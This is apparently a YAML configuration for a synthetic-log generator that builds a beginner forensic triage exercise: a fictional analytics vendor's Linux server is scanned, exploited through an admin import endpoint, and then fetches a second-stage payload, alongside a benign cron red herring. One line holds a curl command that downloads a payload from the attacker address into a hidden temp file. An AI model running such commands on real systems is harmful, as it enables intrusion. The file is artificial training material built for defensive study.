version: "1.0"
name: single-host-linux-rce
description: |
  Minimal single-host beginner forensic scenario. A small analytics SaaS runs
  one public-facing Linux application server (nginx + gunicorn) in a DMZ
  behind a perimeter firewall with network and firewall sensors, plus one
  internal operator workstation. An external actor scans the public portal,
  exploits a public application endpoint to gain code execution as the web
  service account, confirms its context, and retrieves a second-stage payload
  over a plain outbound HTTP connection. A benign nightly maintenance job
  on the same host produces a similarly shaped process cluster to create a
  realistic, low-noise beginner triage exercise.

environment:
  description: "Thornbury Analytics — small analytics SaaS vendor running a single public application server and one internal operator workstation. No Active Directory."

  timezone:
    default: "UTC"

  users:
    - username: sam.ortiz
      full_name: "Sam Ortiz"
      email: "sam.ortiz@thornburyanalytics.com"
      persona: sysadmin
      primary_system: WS-OP-01
      browsing_intensity: light
      enabled: true

  service_accounts:
    - www-data
    - svc-deploy

  network_identities:
    - id: app_api
      hosts: ["api.thornburyanalytics.com"]
      ips: ["45.61.18.5"]
      tags: [web]
      dns: true

  systems:
    - hostname: APP-01
      ip: "10.20.30.10"
      os: "Ubuntu 22.04 LTS"
      type: server
      services: ["nginx", "gunicorn", "ssh"]
      roles: ["web_server"]
      public_hostnames: ["api.thornburyanalytics.com"]

    - hostname: WS-OP-01
      ip: "10.20.10.15"
      os: "Ubuntu 22.04 LTS"
      type: workstation
      assigned_user: sam.ortiz
      services: ["ssh"]

  network:
    public_cidrs:
      - "45.61.18.0/28"

    segments:
      - name: dmz
        cidr: "10.20.30.0/24"
        description: "Small DMZ hosting the public application server"
        exposure: external
        systems: [APP-01]

      - name: internal
        cidr: "10.20.10.0/24"
        description: "Internal segment for the operator workstation"
        exposure: internal
        systems: [WS-OP-01]

    sensors:
      - type: network
        name: dmz-span
        hostname: ZEEK-DMZ-01
        monitoring_segments: [dmz]
        direction: bidirectional
        placement: span
        log_formats: [zeek]
        description: "SPAN sensor mirroring all traffic to/from the DMZ segment"

      - type: firewall
        name: perimeter-fw
        hostname: FW-EDGE-01
        monitoring_segments: [dmz, internal]
        direction: bidirectional
        placement: tap
        log_formats: [cisco_asa]
        interfaces:
          dmz: dmz
          internal: inside
        default_action: deny
        deny_ratio: 3.0
        threat_detection_rate: 10
        nat_rules:
          - type: static
            src: dmz
            real_ip: "10.20.30.10"
            mapped_ip: "45.61.18.5"
          - type: dynamic_pat
            src: [internal]
            mapped_ip: "45.61.18.1"
        policy:
          - {src: external, dst: dmz, ports: [80, 443], action: permit}
          - {src: internal, dst: dmz, ports: [22], action: permit}
          - {src: dmz, dst: external, ports: [80, 443, 53], action: permit}
          - {src: internal, dst: external, ports: [80, 443, 53], action: permit}

time_window:
  start: "2026-08-14T02:00:00Z"
  duration: "2h"

baseline_activity:
  description: "Light background noise: occasional legitimate visitors to the public portal, routine SSH admin checks from the operator workstation, and normal host activity."
  intensity: low
  variation: low
  suspicious_noise: low
  traffic_rates:
    web: low

observation_profile: complete

storyline:
  - id: evt-recon
    time: "+6m"
    actor: www-data
    system: APP-01
    activity: "External scanner probes the public application server"
    events:
      - type: web_scan
        technique: "T1595.002 - Active Scanning: Vulnerability Scanning"
        description: "Scanner probes common web paths and files against the public application server"
        source_ip: "154.16.92.201"
        dst_ip: "45.61.18.5"
        dst_port: 80
        hostname: "api.thornburyanalytics.com"
        preset: nikto
        rate: 3.0
        duration: "2m"

  - id: evt-rce
    time: "+18m"
    actor: www-data
    system: APP-01
    activity: "Attacker submits a crafted request to a public application endpoint and gains code execution as the web service account"
    event_spacing:
      mode: automated
      min_delay: "150ms"
      max_delay: "600ms"
    events:
      - type: connection
        technique: "T1190 - Exploit Public-Facing Application"
        description: "Crafted POST request to the application's configuration import endpoint from the same external host that ran recon; the app returns a success response. The destination host is deliberately modeled as an API/admin endpoint (not a browser-facing site) so the plaintext request is not subject to the environment's public-web HTTPS-redirect default, keeping the response a genuine 200 consistent with the code execution that follows."
        source_ip: "154.16.92.201"
        dst_ip: "45.61.18.5"
        dst_port: 80
        service: http
        hostname: "api.thornburyanalytics.com"
        method: "POST"
        uri: "/admin/config/import"
        user_agent: "python-requests/2.31.0"
        request_body_len: 3684
        status_code: 200
      - type: process
        technique: "T1059.004 - Command and Scripting Interpreter: Unix Shell"
        description: "Application worker process spawns a shell that runs id (T1033 - System Owner/User Discovery) to confirm the effective user context; the command line itself is the discovery evidence, so it is not declared as a second, separately-parented process event"
        process_name: "/bin/sh"
        command_line: "sh -c id"

  - id: evt-c2-fetch
    time: "+24m"
    actor: www-data
    system: APP-01
    activity: "Compromised web process retrieves a second-stage payload from external infrastructure"
    event_spacing:
      mode: automated
      min_delay: "150ms"
      max_delay: "600ms"
    events:
      - type: process
        technique: "T1105 - Ingress Tool Transfer"
        description: "Compromised web process fetches a second-stage payload from the same external host observed during recon and exploitation. The curl command line's URL is sufficient to generate correlated connection, HTTP, and file evidence — a separate connection event is intentionally not declared here to avoid a second, unrelated network flow to the same destination."
        process_name: "/usr/bin/curl"
        command_line: "curl -s http://154.16.92.201/dl/pkg-47a1 -o /tmp/.cache-47a1"

red_herrings:
  - id: rh-nightly-maintenance
    time: "+1h30m"
    actor: svc-deploy
    system: APP-01
    activity: "Scheduled nightly deployment maintenance job archives release artifacts"
    explanation: "svc-deploy runs a cron-scheduled maintenance script every night that packages recent release artifacts for the backup pipeline. The process mix (a python script, a shell, and an archiving tool, all in close succession) superficially resembles the attacker's process activity, but it is distinguishable by account (svc-deploy, not www-data), parent lineage (a deployment login/shell session, not the web worker), the absence of any preceding external HTTP request, and the absence of any outbound network connection."
    event_spacing:
      mode: automated
      min_delay: "200ms"
      max_delay: "800ms"
    events:
      - type: process
        description: "Cron-triggered maintenance script starts"
        process_name: "/usr/bin/python3"
        command_line: "/usr/bin/python3 /opt/deploy/tools/nightly_archive.py"
      - type: process
        description: "Maintenance script invokes a shell wrapper to run the archive step"
        process_name: "/bin/sh"
        command_line: "sh -c '/opt/deploy/tools/archive_release.sh'"
      - type: process
        description: "Shell wrapper compresses the release directory for the nightly backup handoff"
        process_name: "/bin/gzip"
        command_line: "gzip -f /var/deploy/releases/release-2026.08.13.tar"

output:
  logs:
    - format: zeek
    - format: syslog
    - format: bash_history
    - format: cisco_asa
    - format: web_access
    - format: ecar
  destination: "scenarios/single-host-linux-rce"
  compression: false
